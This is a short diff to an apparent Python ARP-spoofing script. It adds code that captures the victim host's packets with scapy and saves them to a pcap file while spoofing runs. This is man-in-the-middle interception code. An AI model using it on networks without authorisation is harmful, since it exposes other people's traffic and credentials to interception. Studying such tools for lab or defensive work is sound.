@@ -60,10 +60,12 @@ def spoof_target(target1, target2):
 def main():
     targets = parse_command_line()
     
-    
     thread.start_new_thread(spoof_target, (targets[0], targets[1]))
     
     try:
+        bpf_filter = "ip host %s" % targets[1]      # assuming that targets[1] is the target ip (not the gateway ip)
+        packets = scapy.sniff(filter=bpf_filter)
+        scapy.wrpcap('arp_spoofer.pcap', packets)
         while True: time.sleep(100)
     except KeyboardInterrupt:
         print("Cleaning up arp tables and resetting changes...")
